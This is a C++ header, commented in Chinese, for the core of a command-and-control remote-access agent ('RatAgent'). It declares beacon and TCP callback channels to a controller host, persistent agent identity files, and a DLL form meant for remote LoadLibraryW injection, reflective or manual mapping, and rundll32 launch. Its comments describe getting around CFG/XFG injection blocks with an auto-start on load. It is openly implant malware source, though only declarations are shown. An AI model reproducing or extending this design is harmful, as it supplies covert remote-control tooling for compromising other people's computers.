// agent_runtime.h — Agent 运行核心（EXE 与 DLL 两种形态共用）
//
// 设计要点（DLL/注入场景）：
//   - 启动只在调用线程做"参数解析 + 建目录 + 起工作线程"，重活都在工作线程里；
//   - 停止通过「进程内原子标志 + 跨进程命名事件」双通道，循环与心跳都可被唤醒；
//   - 不依赖 CWD（DLL 被 rundll32/宿主加载时 CWD 往往是 C:\Windows\System32）；
//   - 不依赖"模块文件路径"（手动映射时磁盘上没有对应文件）。
#pragma once

#include <cstdint>
#include <string>

namespace c2 {

// 运行参数
struct AgentRunArgs {
    std::string host = "192.168.146.1";  // 与既有 exe 默认一致
    uint16_t port = 8080;                // beacon 默认 8080；-tcp 时用 4444
    int sleeptime = 20;                  // beacon 轮询周期（秒）
    bool beacon = true;                  // true=HTTP 轮询信道；false=TCP 长连接
    bool selftest = false;               // --selftest：跑加密自检后退出
    std::string id_path;                 // 空 = agent_default_id_path()
    std::string log_path;                // 空 = agent_default_log_path()（仅 DLL 默认重定向用）
    bool redirect_stdout = false;        // 无控制台时把 stdout 落文件（DLL 默认开）
};

// 解析参数串（空格/逗号/分号分隔，兼容 rundll32 的 "host,port,-s,5" 形式）：
//   [host] [port] [-s N] [-tcp|-beacon] [--selftest] [id=<path>] [log=<path>]
// 返回 false 时 err 给出原因（未知 -开关 视为错误，便于发现配置写错）。
bool agent_parse_args(const std::string& s, AgentRunArgs& out, std::string& err);

// 把 argv 拼成参数串（EXE 入口用）
std::string agent_args_from_argv(int argc, char** argv);

// 默认身份文件路径：exe 为 CWD 下的 <module>.id（保留"相对 CWD"的历史行为）；
// dll 为 %LOCALAPPDATA%\RatAgent\<module>.id（回退 %TEMP%）
// <module> 见 module_id.h —— 文件名带模块前缀，同机多模块才不会互相覆盖身份
std::string agent_default_id_path(bool for_dll);
// 默认日志路径：%LOCALAPPDATA%\RatAgent\<module>.log（回退 %TEMP%）
std::string agent_default_log_path();
// 把 stdout 重定向到文件（无控制台的 DLL/注入场景；会先创建目录）。成功返回 true
bool agent_redirect_stdout(const std::string& path);

// ---- DLL 形态的"加载即自启动" ----
// 背景：现代 Windows 目标的 CFG/XFG 会拦住"把远程线程入口指向镜像内任意导出"的注入方式
//（表现为 0xC0000409/__fastfail），但远程 LoadLibraryW 仍然可用；反射加载更是只调用
// 入口点、完全没有参数通道。因此 DLL 形态采用"加载即自启动"：
//   1) 参数文件 <module>.autostart.args **存在且内容非空**（内容 = agent 参数串，与 StartAgent 同语法）
//      → 用文件里的参数（**优先级最高**）；
//   2) 文件不存在 / 读取失败 / 内容为空（或全空白）
//      → 一律视为"未触发"，用内置默认配置（beacon 127.0.0.1:8080、轮询 5s；
//      <module>.id / 日志落 %LOCALAPPDATA%\RatAgent\）。
// 参数文件路径（按顺序探测，取第一个**内容非空**的）：
//   %LOCALAPPDATA%\RatAgent\<module>.autostart.args   （首选；DLL 默认目录）
//   %TEMP%\RatAgent\<module>.autostart.args
// 空文件会被跳过并继续探测下一个候选，不会把后面真正带参数的挡掉。
//
// ⚠ 自启在 DllMain 之后的新线程上进行（Sleep 300ms 脱离 loader lock），而显式入口
//（rundll32 的 Start/Stop、宿主的 StartAgent）由加载方紧接着调用，二者存在竞争：
// 显式入口先到就正常接管；若晚于这 300ms，则会被默认自启抢先——表现为参数被忽略
//（Start/StartAgent 报 already running）或 Stop 走同进程分支而不再通知目标进程。
std::string agent_autostart_path();                  // 首选路径（供注入方写入）
// 读参数文件；**只有文件存在且内容非空**才回填参数串并返回 true
//（无文件 / 读失败 / 内容为空 → 返回 false，由调用方用默认配置）
// 只用 Win32 + 栈缓冲，可在 DllMain 的 loader lock 下安全调用
bool agent_autostart_requested(std::string& args);

// 启动：内部起工作线程后立即返回；已在运行返回 false
bool agent_start(const AgentRunArgs& args, std::string& err);
// 请求停止（置标志 + 触发命名事件 + shutdown 活动 socket）并等待线程退出
bool agent_stop(int timeout_ms = 8000);
// 只置停止标志（DllMain(DETACH) 用：loader lock 下不可等线程）
void agent_request_stop();
// 等待工作线程结束（EXE 用，timeout_ms < 0 表示一直等）
bool agent_wait(int timeout_ms = -1);
bool agent_running();
const char* agent_mode();     // "beacon" | "tcp" | "stopped"
const char* agent_version();  // 形如 "1.0-dll" / "1.0-exe"
// 当前 agent_id 的 hex（运行中才有值，供跨进程停止事件命名）
std::string agent_id_hex();
// 跨进程停止：从 id 文件推出事件名并触发（供"另一个进程"的 Stop 导出调用）
bool agent_signal_stop_by_id_file(const std::string& id_path);
// 跨进程停止：直接用 agent_id 的 hex（32 字符）推出事件名并触发
bool agent_signal_stop_by_id_hex(const std::string& hex32);

// ---- 供工作循环使用 ----
bool agent_stop_requested();               // 原子标志 || 命名事件已触发
void agent_set_active_socket(uintptr_t s); // 注册当前连接，stop 时 shutdown 打断阻塞读
uintptr_t agent_active_socket();
// 可被停止唤醒的睡眠（分片检查停止标志，最长分片 200ms）
void agent_sleep(int total_ms);

}  // namespace c2
